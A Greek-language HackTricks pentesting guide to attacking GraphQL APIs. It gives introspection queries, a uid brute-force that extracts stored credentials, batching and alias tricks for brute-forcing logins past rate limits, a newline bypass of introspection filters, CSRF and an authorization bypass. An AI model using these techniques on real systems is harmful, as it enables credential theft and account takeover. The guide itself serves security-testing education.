# GraphQL

<details>

<summary><strong>Μάθετε το χάκινγκ στο AWS από το μηδέν μέχρι τον ήρωα με το</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Άλλοι τρόποι υποστήριξης του HackTricks:

* Αν θέλετε να δείτε τη **εταιρεία σας να διαφημίζεται στο HackTricks** ή να **κατεβάσετε το HackTricks σε μορφή PDF** ελέγξτε τα [**ΣΧΕΔΙΑ ΣΥΝΔΡΟΜΗΣ**](https://github.com/sponsors/carlospolop)!
* Αποκτήστε το [**επίσημο PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ανακαλύψτε [**την Οικογένεια PEASS**](https://opensea.io/collection/the-peass-family), τη συλλογή μας από αποκλειστικά [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Εγγραφείτε** στην 💬 [**ομάδα Discord**](https://discord.gg/hRep4RUj7f) ή στην [**ομάδα τηλεγραφήματος**](https://t.me/peass) ή **ακολουθήστε** μας στο **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Μοιραστείτε τα χάκινγκ κόλπα σας υποβάλλοντας PRs** στα [**HackTricks**](https://github.com/carlospolop/hacktricks) και [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) αποθετήρια του github.

</details>

## Εισαγωγή

Το GraphQL **επισημαίνεται** ως μια **αποτελεσματική εναλλακτική λύση** στο REST API, προσφέροντας μια απλοποιημένη προσέγγιση για τον ερώτηση δεδομένων από το backend. Σε αντίθεση με το REST, το οποίο συχνά απαιτεί πολλαπλά αιτήματα σε διάφορα σημεία ενδιαφέροντος για τη συλλογή δεδομένων, το GraphQL επιτρέπει τη λήψη όλων των απαιτούμενων πληροφοριών μέσω ενός **μόνο αιτήματος**. Αυτή η απλοποίηση ωφελεί σημαντικά τους προγραμματιστές μειώνοντας την πολυπλοκότητα των διαδικασιών ανάκτησης δεδομένων τους.

## GraphQL και Ασφάλεια

Με την εμφάνιση νέων τεχνολογιών, συμπεριλαμβανομένου του GraphQL, εμφανίζονται επίσης νέες ευπάθειες ασφαλείας. Ένα σημαντικό σημείο προς σημείωση είναι ότι το **GraphQL δεν περιλαμβάνει μηχανισμούς πιστοποίησης από προεπιλογή**. Είναι ευθύνη των προγραμματιστών να υλοποιήσουν τέτοια μέτρα ασφαλείας. Χωρίς κατάλληλη πιστοποίηση, τα σημεία τερματισμού του GraphQL μπορεί να αποκαλύψουν ευαίσθητες πληροφορίες σε μη πιστοποιημένους χρήστες, δημιουργώντας ένα σημαντικό κίνδυνο ασφάλειας.

### Επιθέσεις Διερεύνησης Κατάλογου και GraphQL

Για την εντοπισμό εκτεθειμένων περιπτώσεων GraphQL, συνιστάται η συμπερίληψη συγκεκριμένων διαδρομών σε επιθέσεις διερεύνησης καταλόγου. Αυτοί οι διαδρομοί είναι:

* `/graphql`
* `/graphiql`
* `/graphql.php`
* `/graphql/console`
* `/api`
* `/api/graphql`
* `/graphql/api`
* `/graphql/graphql`

Η εντοπισμός ανοικτών περιπτώσεων GraphQL επιτρέπει την εξέταση των υποστηριζόμενων ερωτημάτων. Αυτό είναι κρίσιμο για την κατανόηση των δεδομένων προσβάσιμων μέσω του σημείου τερματισμού. Το σύστημα εσωστρέφειας του GraphQL διευκολύνει αυτό με τη λεπτομερή περιγραφή των ερωτημάτων που υποστηρίζει ένα σχήμα. Για περισσότερες πληροφορίες επί του θέματος, ανατρέξτε στην τεκμηρίωση του GraphQL για την εσωστρέφεια: [**GraphQL: Γλώσσα ερωτημάτων για APIs.**](https://graphql.org/learn/introspection/)

### Αναγνώριση

Το εργαλείο [**graphw00f**](https://github.com/dolevf/graphw00f) είναι ικανό να ανιχνεύσει ποια μηχανή GraphQL χρησιμοποιείται σε έναν διακομιστή και στη συνέχεια εκτυπώνει μερικές χρήσιμες πληροφορίες για τον ελεγκτή ασφαλείας.

#### Παγκόσμια ερωτήματα <a href="#universal-queries" id="universal-queries"></a>

Για να ελεγχθεί αν μια διεύθυνση URL είναι ένα υπηρεσία GraphQL, μπορεί να σταλεί ένα **παγκόσμιο ερώτημα**, `query{__typename}`. Αν η απάντηση περιλαμβάνει `{"data": {"__typename": "Query"}}`, επιβεβαιώνει ότι η διεύθυνση URL φιλοξενεί ένα σημείο τερματισμού GraphQL. Αυτή η μέθοδος βασίζεται στο πεδίο `__typename` του GraphQL, το οποίο αποκαλύπτει τον τύπο του αντικειμένου που ερωτήθηκε.
```javascript
query{__typename}
```
### Βασική Απαρίθμηση

Το Graphql συνήθως υποστηρίζει **GET**, **POST** (x-www-form-urlencoded) και **POST**(json). Ωστόσο, για λόγους ασφαλείας συνιστάται να επιτρέπεται μόνο το json για να αποτραπούν οι επιθέσεις CSRF.

#### Εσωστρέφεια

Για να χρησιμοποιήσετε την εσωστρέφεια για να ανακαλύψετε πληροφορίες σχήματος, ερευνήστε το πεδίο `__schema`. Αυτό το πεδίο είναι διαθέσιμο στον ριζικό τύπο όλων των ερωτημάτων.
```bash
query={__schema{types{name,fields{name}}}}
```
Με αυτό το ερώτημα θα βρείτε το όνομα όλων των τύπων που χρησιμοποιούνται:

![](<../../.gitbook/assets/image (1036).png>)

{% code overflow="wrap" %}
```bash
query={__schema{types{name,fields{name,args{name,description,type{name,kind,ofType{name, kind}}}}}}}
```
{% endcode %}

Με αυτό το ερώτημα μπορείτε να εξάγετε όλους τους τύπους, τα πεδία τους και τα ορίσματά τους (και τον τύπο των ορισμάτων). Αυτό θα είναι πολύ χρήσιμο για να ξέρετε πώς να κάνετε ερωτήματα στη βάση δεδομένων.

![](<../../.gitbook/assets/image (950).png>)

**Σφάλματα**

Είναι ενδιαφέρον να γνωρίζουμε αν τα **σφάλματα** θα εμφανίζονται καθώς θα συμβάλουν με χρήσιμες **πληροφορίες**.
```
?query={__schema}
?query={}
?query={thisdefinitelydoesnotexist}
```
**Απαριθμήστε το Σχήμα της Βάσης Δεδομένων μέσω Εσωστρέφειας**

{% hint style="info" %}
Εάν η εσωστρέφεια είναι ενεργοποιημένη αλλά η παραπάνω ερώτηση δεν εκτελείται, δοκιμάστε να αφαιρέσετε τις οδηγίες `onOperation`, `onFragment` και `onField` από τη δομή της ερώτησης.
{% endhint %}
```bash
#Full introspection query

query IntrospectionQuery {
__schema {
queryType {
name
}
mutationType {
name
}
subscriptionType {
name
}
types {
...FullType
}
directives {
name
description
args {
...InputValue
}
onOperation  #Often needs to be deleted to run query
onFragment   #Often needs to be deleted to run query
onField      #Often needs to be deleted to run query
}
}
}

fragment FullType on __Type {
kind
name
description
fields(includeDeprecated: true) {
name
description
args {
...InputValue
}
type {
...TypeRef
}
isDeprecated
deprecationReason
}
inputFields {
...InputValue
}
interfaces {
...TypeRef
}
enumValues(includeDeprecated: true) {
name
description
isDeprecated
deprecationReason
}
possibleTypes {
...TypeRef
}
}

fragment InputValue on __InputValue {
name
description
type {
...TypeRef
}
defaultValue
}

fragment TypeRef on __Type {
kind
name
ofType {
kind
name
ofType {
kind
name
ofType {
kind
name
}
}
}
}
```
Ερώτημα ενσωματωμένης επιθεώρησης:
```
/?query=fragment%20FullType%20on%20Type%20{+%20%20kind+%20%20name+%20%20description+%20%20fields%20{+%20%20%20%20name+%20%20%20%20description+%20%20%20%20args%20{+%20%20%20%20%20%20...InputValue+%20%20%20%20}+%20%20%20%20type%20{+%20%20%20%20%20%20...TypeRef+%20%20%20%20}+%20%20}+%20%20inputFields%20{+%20%20%20%20...InputValue+%20%20}+%20%20interfaces%20{+%20%20%20%20...TypeRef+%20%20}+%20%20enumValues%20{+%20%20%20%20name+%20%20%20%20description+%20%20}+%20%20possibleTypes%20{+%20%20%20%20...TypeRef+%20%20}+}++fragment%20InputValue%20on%20InputValue%20{+%20%20name+%20%20description+%20%20type%20{+%20%20%20%20...TypeRef+%20%20}+%20%20defaultValue+}++fragment%20TypeRef%20on%20Type%20{+%20%20kind+%20%20name+%20%20ofType%20{+%20%20%20%20kind+%20%20%20%20name+%20%20%20%20ofType%20{+%20%20%20%20%20%20kind+%20%20%20%20%20%20name+%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20ofType%20{+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20kind+%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20name+%20%20%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20%20%20}+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}++query%20IntrospectionQuery%20{+%20%20schema%20{+%20%20%20%20queryType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20mutationType%20{+%20%20%20%20%20%20name+%20%20%20%20}+%20%20%20%20types%20{+%20%20%20%20%20%20...FullType+%20%20%20%20}+%20%20%20%20directives%20{+%20%20%20%20%20%20name+%20%20%20%20%20%20description+%20%20%20%20%20%20locations+%20%20%20%20%20%20args%20{+%20%20%20%20%20%20%20%20...InputValue+%20%20%20%20%20%20}+%20%20%20%20}+%20%20}+}
```
Η τελευταία γραμμή κώδικα είναι ένα ερώτημα graphql που θα αδειάσει όλες τις μετα-πληροφορίες από το graphql (ονόματα αντικειμένων, παραμέτρους, τύπους...)

![](<../../.gitbook/assets/image (363).png>)

Εάν η εσωστρέφεια είναι ενεργοποιημένη, μπορείτε να χρησιμοποιήσετε το [**GraphQL Voyager**](https://github.com/APIs-guru/graphql-voyager) για να δείτε σε μια γραφική διεπαφή όλες τις επιλογές.

### Ερωτήματα

Τώρα που γνωρίζουμε ποιο είδος πληροφοριών αποθηκεύεται μέσα στη βάση δεδομένων, ας προσπαθήσουμε να **εξάγουμε μερικές τιμές**.

Στην εσωστρέφεια μπορείτε να βρείτε **ποιο αντικείμενο μπορείτε να ερωτήσετε απευθείας** (επειδή δεν μπορείτε να ερωτήσετε ένα αντικείμενο απλώς επειδή υπάρχει). Στην παρακάτω εικόνα μπορείτε να δείτε ότι το "_queryType_" ονομάζεται "_Query_" και ότι ένα από τα πεδία του αντικειμένου "_Query_" είναι το "_flags_", το οποίο είναι επίσης ένας τύπος αντικειμένου. Συνεπώς, μπορείτε να ερωτήσετε το αντικείμενο σημαία.

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-17-48.png>)

Σημειώστε ότι ο τύπος του ερωτήματος "_flags_" είναι "_Flags_", και αυτό το αντικείμενο ορίζεται ως εξής:

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-22-57 (1).png>)

Μπορείτε να δείτε ότι τα αντικείμενα "_Flags_" αποτελούνται από **όνομα** και **τιμή**. Έπειτα μπορείτε να πάρετε όλα τα ονόματα και τις τιμές των σημαιών με το ερώτημα:
```javascript
query={flags{name, value}}
```
Σημειώστε ότι σε περίπτωση που το **αντικείμενο προς ερώτηση** είναι ένα **πρωτογενές** **τύπος** όπως **συμβολοσειρά** όπως στο ακόλουθο παράδειγμα

![](<../../.gitbook/assets/image (958).png>)

Μπορείτε απλά να το ερωτήσετε με:
```javascript
query={hiddenFlags}
```
Σε ένα άλλο παράδειγμα όπου υπήρχαν 2 αντικείμενα μέσα στο αντικείμενο τύπου "_Query_": "_user_" και "_users_".\
Αν αυτά τα αντικείμενα δεν χρειάζονται κάποιο όρισμα για αναζήτηση, θα μπορούσατε **να ανακτήσετε όλες τις πληροφορίες από αυτά** απλά **ζητώντας** τα δεδομένα που θέλετε. Σε αυτό το παράδειγμα από το Internet θα μπορούσατε να εξάγετε τα αποθηκευμένα ονόματα χρηστών και κωδικούς πρόσβασης:

![](<../../.gitbook/assets/image (880).png>)

Ωστόσο, σε αυτό το παράδειγμα, αν προσπαθήσετε να το κάνετε, λαμβάνετε αυτό το **σφάλμα**:

![](<../../.gitbook/assets/image (1042).png>)

Φαίνεται ότι κάπως θα αναζητήσει χρησιμοποιώντας το όρισμα "_**uid**_" τύπου _**Int**_.\
Πάντως, ήδη γνωρίζαμε ότι, στην ενότητα [Βασική Απαρίθμηση](graphql.md#basic-enumeration) προτάθηκε μια ερώτηση που μας έδειχνε όλες τις απαραίτητες πληροφορίες: `query={__schema{types{name,fields{name, args{name,description,type{name, kind, ofType{name, kind}}}}}}}`

Αν διαβάσετε την παρεχόμενη εικόνα όταν εκτελέσω αυτήν την ερώτηση, θα δείτε ότι το "_**user**_" είχε το **όρισμα** "_**uid**_" τύπου _Int_.

Έτσι, κάνοντας μια ελαφριά επίθεση _**uid**_ bruteforce, βρήκα ότι στο _**uid**=**1**_ ανακτήθηκε ένα όνομα χρήστη και ένας κωδικός πρόσβασης:\
`query={user(uid:1){user,password}}`

![](<../../.gitbook/assets/image (90).png>)

Σημειώστε ότι **ανακάλυψα** ότι μπορούσα να ζητήσω τις **παραμέτρους** "_**user**_" και "_**password**_" επειδή αν προσπαθήσω να αναζητήσω κάτι που δεν υπάρχει (`query={user(uid:1){noExists}}`) λαμβάνω αυτό το σφάλμα:

![](<../../.gitbook/assets/image (707).png>)

Κατά τη διάρκεια της φάσης **απαρίθμησης** ανακάλυψα ότι το αντικείμενο "_**dbuser**_" είχε ως πεδία "_**user**_" και "_**password**_.

**Κόλπος αδειάζει τη συμβολοσειρά ερωτήματος (ευχαριστίες στον @BinaryShadow\_)**

Αν μπορείτε να αναζητήσετε με βάση τον τύπο συμβολοσειράς, όπως: `query={theusers(description: ""){username,password}}` και **αναζητήσετε ένα κενό συμβολοσειράς** θα **εκφορτώσει όλα τα δεδομένα**. (_Σημείωση ότι αυτό το παράδειγμα δεν σχετίζεται με το παράδειγμα των οδηγιών, για αυτό το παράδειγμα υποθέστε ότι μπορείτε να αναζητήσετε χρησιμοποιώντας τον "**theusers**" με ένα πεδίο Συμβολοσειράς που ονομάζεται "**description**"_).

### Αναζήτηση

Σε αυτή τη διάταξη, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. Τα **άτομα** αναγνωρίζονται με το **email** και το **όνομά** τους· οι **ταινίες** με το **όνομά** και τη **βαθμολογία** τους. Τα **άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδηλώνοντας σχέσεις μέσα στη βάση δεδομένων.

Μπορείτε να **αναζητήσετε** άτομα **με βάση** το **όνομά** τους και να λάβετε τα emails τους:
```javascript
{
searchPerson(name: "John Doe") {
email
}
}
```
Μπορείτε **να αναζητήσετε** πρόσωπα **με βάση το όνομά τους** και να λάβετε τις **ταινίες στις οποίες έχουν εγγραφεί**:
```javascript
{
searchPerson(name: "John Doe") {
email
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
Σημειώστε πώς υποδεικνύεται η ανάκτηση του `name` των `subscribedMovies` του ατόμου.

Μπορείτε επίσης **να αναζητήσετε πολλά αντικείμενα ταυτόχρονα**. Σε αυτήν την περίπτωση, γίνεται αναζήτηση 2 ταινιών:
```javascript
{
searchPerson(subscribedMovies: [{name: "Inception"}, {name: "Rocky"}]) {
name
}
}r
```
Ή ακόμα και **σχέσεις πολλαπλών διαφορετικών αντικειμένων χρησιμοποιώντας ψευδώνυμα**:
```javascript
{
johnsMovieList: searchPerson(name: "John Doe") {
subscribedMovies {
edges {
node {
name
}
}
}
}
davidsMovieList: searchPerson(name: "David Smith") {
subscribedMovies {
edges {
node {
name
}
}
}
}
}
```
### Μεταλλάξεις

**Οι μεταλλάξεις χρησιμοποιούνται για να γίνουν αλλαγές στην πλευρά του διακομιστή.**

Στην **εσωστρέφεια** μπορείτε να βρείτε τις **δηλωμένες** **μεταλλάξεις**. Στην παρακάτω εικόνα το "_MutationType_" ονομάζεται "_Mutation_" και το αντικείμενο "_Mutation_" περιέχει τα ονόματα των μεταλλάξεων (όπως το "_addPerson_" σε αυτήν την περίπτωση):

![](<../../.gitbook/assets/Screenshot from 2021-03-13 18-26-27 (1).png>)

Σε αυτή τη διάταξη, μια **βάση δεδομένων** περιέχει **άτομα** και **ταινίες**. Τα **άτομα** αναγνωρίζονται με το **email** και το **όνομά** τους· οι **ταινίες** με το **όνομά** και τη **βαθμολογία** τους. Τα **άτομα** μπορούν να είναι φίλοι μεταξύ τους και επίσης να έχουν ταινίες, υποδεικνύοντας σχέσεις μέσα στη βάση δεδομένων.

Μια μετάλλαξη για τη **δημιουργία νέων** ταινιών μέσα στη βάση δεδομένων μπορεί να είναι όπως η παρακάτω (σε αυτό το παράδειγμα η μετάλλαξη ονομάζεται `addMovie`):
```javascript
mutation {
addMovie(name: "Jumanji: The Next Level", rating: "6.8/10", releaseYear: 2019) {
movies {
name
rating
}
}
}
```
**Σημειώστε πώς και οι τιμές και ο τύπος των δεδομένων υποδεικνύονται στο ερώτημα.**

Επιπλέον, η βάση δεδομένων υποστηρίζει μια λειτουργία **μετάλλαξης**, με το όνομα `addPerson`, η οποία επιτρέπει τη δημιουργία **προσώπων** μαζί με τις συσχετίσεις τους με υπάρχοντες **φίλους** και **ταινίες**. Είναι κρίσιμο να σημειωθεί ότι οι φίλοι και οι ταινίες πρέπει να υπάρχουν προηγουμένως στη βάση δεδομένων πριν συνδεθούν με το νεοδημιουργημένο άτομο.
```javascript
mutation {
addPerson(name: "James Yoe", email: "jy@example.com", friends: [{name: "John Doe"}, {email: "jd@example.com"}], subscribedMovies: [{name: "Rocky"}, {name: "Interstellar"}, {name: "Harry Potter and the Sorcerer's Stone"}]) {
person {
name
email
friends {
edges {
node {
name
email
}
}
}
subscribedMovies {
edges {
node {
name
rating
releaseYear
}
}
}
}
}
}
```
### Υπερφόρτωση Οδηγιών

Όπως εξηγείται σε [**ένα από τα ευπάθειες που περιγράφονται σε αυτήν την αναφορά**](https://www.landh.tech/blog/20240304-google-hack-50000/), η υπερφόρτωση μιας οδηγίας σημαίνει την κλήση μιας οδηγίας ακόμη και εκατομμύρια φορές για να κάνει τον διακομιστή να σπαταλήσει λειτουργίες μέχρι να είναι δυνατόν να γίνει DoS.

### Συγχρονισμός επίθεσης βίας σε 1 αίτημα API

Αυτή η πληροφορία προέρχεται από [https://lab.wallarm.com/graphql-batching-attack/](https://lab.wallarm.com/graphql-batching-attack/).\
Η ταυτοποίηση μέσω του GraphQL API με **την ταυτόχρονη αποστολή πολλών ερωτημάτων με διαφορετικές διαπιστευτήρια** για έλεγχο. Είναι μια κλασική επίθεση βίας, αλλά τώρα είναι δυνατόν να στείλετε περισσότερα από ένα ζεύγη σύνδεσης/κωδικού πρόσβασης ανά αίτημα HTTP λόγω της δυνατότητας συγχρονισμού του GraphQL. Αυτή η προσέγγιση θα παραπλανήσει εφαρμογές εξωτερικής παρακολούθησης ρυθμού να νομίζουν ότι όλα είναι καλά και ότι δεν υπάρχει bot που προσπαθεί να μαντέψει κωδικούς πρόσβασης.

Παρακάτω μπορείτε να βρείτε την απλούστερη επίδειξη ενός αιτήματος ταυτοποίησης εφαρμογής, με **3 διαφορετικά ζεύγη email/κωδικών πρόσβασης ταυτόχρονα**. Φυσικά είναι δυνατόν να στείλετε χιλιάδες σε ένα μόνο αίτημα με τον ίδιο τρόπο:

![](<../../.gitbook/assets/image (1081).png>)

Όπως βλέπουμε από το στιγμιότυπο απόκρισης, τα πρώτο και τρίτο αιτήματα επέστρεψαν _null_ και αντανακλούν τις αντίστοιχες πληροφορίες στην ενότητα _σφάλματος_. Η **δεύτερη μετάλλαξη είχε τα σωστά στοιχεία ταυτοποίησης** και η απόκριση είχε το σωστό τεκμήριο συνεδρίας ταυτοποίησης.

![](<../../.gitbook/assets/image (119) (1).png>)

## GraphQL Χωρίς Εισαγωγή

Όλο και περισσότερα **σημεία πρόσβασης του graphql απενεργοποιούν την εισαγωγή**. Ωστόσο, τα σφάλματα που εκτοξεύει το graphql όταν λαμβάνει ένα απροσδόκητο αίτημα είναι αρκετά για εργαλεία όπως το [**clairvoyance**](https://github.com/nikitastupin/clairvoyance) να ανακτήσουν το μεγαλύτερο μέρος του σχήματος.

Επιπλέον, η επέκταση του Burp Suite [**GraphQuail**](https://github.com/forcesunseen/graphquail) **παρατηρεί τα αιτήματα GraphQL API που περνούν μέσω του Burp** και **δημιουργεί** ένα εσωτερικό GraphQL **σχήμα** με κάθε νέο ερώτημα που βλέπει. Μπορεί επίσης να αποκαλύψει το σχήμα για το GraphiQL και το Voyager. Η επέκταση επιστρέφει μια ψεύτικη απόκριση όταν λαμβάνει ένα αίτημα εισαγωγής. Ως αποτέλεσμα, το GraphQuail εμφανίζει όλα τα ερωτήματα, τα ορίσματα και τα πεδία που είναι διαθέσιμα για χρήση μέσα στο API. Για περισσότερες πληροφορίες [**ελέγξτε αυτό**](https://blog.forcesunseen.com/graphql-security-testing-without-a-schema).

Μια ωραία **λίστα λέξεων** για την ανακάλυψη [**οντοτήτων GraphQL μπορεί να βρεθεί εδώ**](https://github.com/Escape-Technologies/graphql-wordlist?).

### Παράκαμψη Άμυνας Εισαγωγής GraphQL <a href="#bypassing-graphql-introspection-defences" id="bypassing-graphql-introspection-defences"></a>

Για να παρακάμψετε τους περιορισμούς στα ερωτήματα εισαγωγής σε APIs, η εισαγωγή ενός **ειδικού χαρακτήρα μετά τη λέξη-κλειδί `__schema`** αποδεικνύεται αποτελεσματική. Αυτή η μέθοδος εκμεταλλεύεται συνηθισμένες παραβιάσεις προγραμματιστών σε μοτίβα regex που στοχεύουν στο να μπλοκάρουν την εισαγωγή εστιάζοντας στη λέξη-κλειδί `__schema`. Προσθέτοντας χαρακτήρες όπως **κενά, νέες γραμμές και κόμματα**, τα οποία το GraphQL αγνοεί αλλά ενδέχεται να μην λαμβάνονται υπόψη στα regex, μπορούν να παρακαμφθούν οι περιορισμοί. Για παράδειγμα, ένα ερώτημα εισαγωγής με μια νέα γραμμή μετά το `__schema` μπορεί να παρακάμψει τέτοιες αμυντικές διατάξεις:
```bash
# Example with newline to bypass
{
"query": "query{__schema
{queryType{name}}}"
}
```
Αν αντιμετωπίζετε ανεπιτυχία, εξετάστε εναλλακτικές μεθόδους αιτήσεων, όπως **αιτήσεις GET** ή **POST με `x-www-form-urlencoded`**, καθώς οι περιορισμοί μπορεί να ισχύουν μόνο για αιτήσεις POST.

### **Ανακάλυψη Εκθεσμένων Δομών GraphQL**

Όταν η εσωστρέφεια είναι απενεργοποιημένη, η εξέταση του πηγαίου κώδικα της ιστοσελίδας για προφορτωμένες ερωτήσεις σε βιβλιοθήκες JavaScript είναι μια χρήσιμη στρατηγική. Αυτές οι ερωτήσεις μπορούν να βρεθούν χρησιμοποιώντας την καρτέλα `Sources` στα εργαλεία προγραμματιστή, παρέχοντας εισαγωγές στο σχήμα του API και αποκαλύπτοντας πιθανώς **εκτεθειμένες ευαίσθητες ερωτήσεις**. Οι εντολές για αναζήτηση μέσα στα εργαλεία προγραμματιστή είναι:
```javascript
Inspect/Sources/"Search all files"
file:* mutation
file:* query
```
## CSRF στο GraphQL

Αν δεν ξέρετε τι είναι το CSRF, διαβάστε την ακόλουθη σελίδα:

{% content-ref url="../../pentesting-web/csrf-cross-site-request-forgery.md" %}
[csrf-cross-site-request-forgery.md](../../pentesting-web/csrf-cross-site-request-forgery.md)
{% endcontent-ref %}

Εκεί θα μπορέσετε να βρείτε αρκετά σημεία πρόσβασης GraphQL **που έχουν διαμορφωθεί χωρίς τα CSRF τokens.**

Σημειώστε ότι οι αιτήσεις GraphQL συνήθως στέλνονται μέσω αιτήσεων POST χρησιμοποιώντας το Content-Type **`application/json`**.
```javascript
{"operationName":null,"variables":{},"query":"{\n  user {\n    firstName\n    __typename\n  }\n}\n"}
```
Ωστόσο, οι περισσότεροι τερματικοί GraphQL υποστηρίζουν επίσης αιτήσεις **`form-urlencoded` POST:**
```javascript
query=%7B%0A++user+%7B%0A++++firstName%0A++++__typename%0A++%7D%0A%7D%0A
```
Επομένως, καθώς οι αιτήσεις CSRF όπως οι προηγούμενες στέλνονται **χωρίς προερώτηση**, είναι δυνατόν να **πραγματοποιηθούν** **αλλαγές** στο GraphQL καταχρώντας ένα CSRF.

Ωστόσο, σημειώστε ότι η νέα προεπιλεγμένη τιμή του cookie με τη σημαία `samesite` του Chrome είναι `Lax`. Αυτό σημαίνει ότι το cookie θα σταλεί μόνο από μια τρίτη ιστοσελίδα σε αιτήσεις GET.

Σημειώστε ότι συνήθως είναι δυνατόν να στείλετε την **αίτηση** **ερώτησης** επίσης ως αίτηση **GET και το CSRF token ενδέχεται να μην επικυρωθεί σε μια αίτηση GET.**

Επίσης, καταχρώντας μια [**επίθεση XS-Search**](../../pentesting-web/xs-search/) είναι δυνατόν να εξαγάγετε περιεχόμενο από το σημείο του GraphQL καταχρώντας τα διαπιστευτήρια του χρήστη.

Για περισσότερες πληροφορίες **ελέγξτε τη** [**αρχική δημοσίευση εδώ**](https://blog.doyensec.com/2021/05/20/graphql-csrf.html).

## Εξουσιοδότηση στο GraphQL

Πολλές λειτουργίες GraphQL που έχουν οριστεί στο σημείο μπορεί να ελέγχουν μόνο την ταυτοποίηση του αιτούντος αλλά όχι την εξουσιοδότηση.

Η τροποποίηση των μεταβλητών εισόδου της ερώτησης θα μπορούσε να οδηγήσει σε διαρροή ευαίσθητων λεπτομερειών λογαριασμού [διαρροή](https://hackerone.com/reports/792927).

Η μετάλλαξη θα μπορούσε ακόμη να οδηγήσει σε ανάληψη λογαριασμού προσπαθώντας να τροποποιήσει δεδομένα άλλου λογαριασμού.
```javascript
{
"operationName":"updateProfile",
"variables":{"username":INJECT,"data":INJECT},
"query":"mutation updateProfile($username: String!,...){updateProfile(username: $username,...){...}}"
}
```
### Παράκαμψη της εξουσιοδότησης στο GraphQL

Η [σύνδεση ερωτήσεων](https://s1n1st3r.gitbook.io/theb10g/graphql-query-authentication-bypass-vuln) μπορεί να παρακάμψει ένα αδύναμο σύστημα ελέγχου ταυτότητας.

Στο παρακάτω παράδειγμα μπορείτε να δείτε ότι η λειτουργία είναι "forgotPassword" και ότι θα πρέπει να εκτελέσει μόνο την ερώτηση forgotPassword που τη συνοδεύει. Αυτό μπορεί να παρακαμφθεί προσθέτοντας μια ερώτηση στο τέλος, σε αυτήν την περίπτωση προσθέτουμε "register" και μια μεταβλητή χρήστη για το σύστημα να εγγραφεί ως νέος χρήστης.

<figure><img src="../../.gitbook/assets/GraphQLAuthBypassMethod.PNG" alt=""><figcaption></figcaption></figure>

## Παράκαμψη Ορίων Ρυθμού Χρήσης Χρησιμοποιώντας Ψευδώνυμα στο GraphQL

Στο GraphQL, τα ψευδώνυμα είναι μια ισχυρή λειτουργία που επιτρέπει τη **ονομασία των ιδιοτήτων με σαφήνεια** κατά την αποστολή αιτήματος API. Αυτή η δυνατότητα είναι ιδιαίτερα χρήσιμη για την ανάκτηση **πολλαπλών περιπτώσεων του ίδιου τύπου** αντικειμένου μέσα σε ένα μόνο αίτημα. Τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να ξεπεραστεί η περιοριστική διάταξη που εμποδίζει τα αντικείμενα GraphQL να έχουν πολλαπλές ιδιότητες με το ίδιο όνομα.

Για μια λεπτομερή κατανόηση των ψευδωνύμων στο GraphQL, συνιστάται ο παρακάτω πόρος: [Ψευδώνυμα](https://portswigger.net/web-security/graphql/what-is-graphql#aliases).

Ενώ ο κύριος σκοπός των ψευδωνύμων είναι να μειώσει την ανάγκη για πολλαπλές κλήσεις API, έχει αναγνωριστεί ένα μη προσδιορισμένο περιστατικό όπου τα ψευδώνυμα μπορούν να χρησιμοποιηθούν για να εκτελέσουν επιθέσεις βίας με τη μέθοδο brute force σε ένα σημείο GraphQL. Αυτό είναι δυνατό επειδή μερικά σημεία πρόσβασης προστατεύονται από ρυθμιστές ρυθμού που έχουν σχεδιαστεί για να αποτρέψουν επιθέσεις brute force περιορίζοντας τον **αριθμό των αιτήσεων HTTP**. Ωστόσο, αυτοί οι ρυθμιστές ρυθμού ενδέχεται να μην λαμβάνουν υπόψη τον αριθμό των λειτουργιών μέσα σε κάθε αίτημα. Δεδομένου ότι τα ψευδώνυμα επιτρέπουν τη συμπερίληψη πολλαπλών ερωτήσεων σε ένα μόνο αίτημα HTTP, μπορούν να παρακάμψουν τέτοια μέτρα περιορισμού του ρυθμού.

Λάβετε υπόψη το παρακάτω παράδειγμα, το οποίο επεξηγεί πώς μπορούν να χρησιμοποιηθούν ψευδώνυμα ερωτήσεων για να επαληθευτεί η εγκυρότητα των κωδικών έκπτωσης καταστήματος. Αυτή η μέθοδος θα μπορούσε να παρακάμψει τον περιορισμό του ρυθμού χρήσης καθώς συγκεντρώνει αρκετές ερωτήσεις σε ένα αίτημα HTTP, επιτρέποντας πιθανώς την επαλήθευση πολλών κωδικών έκπτωσης ταυτόχρονα.
```bash
# Example of a request utilizing aliased queries to check for valid discount codes
query isValidDiscount($code: Int) {
isvalidDiscount(code:$code){
valid
}
isValidDiscount2:isValidDiscount(code:$code){
valid
}
isValidDiscount3:isValidDiscount(code:$code){
valid
}
}
```
## Εργαλεία

### Σαρωτές ευπαθειών

* [https://github.com/dolevf/graphql-cop](https://github.com/dolevf/graphql-cop): Δοκιμάζει κοινές λανθάνουσες ρυθμίσεις των σημείων πρόσβασης του graphql
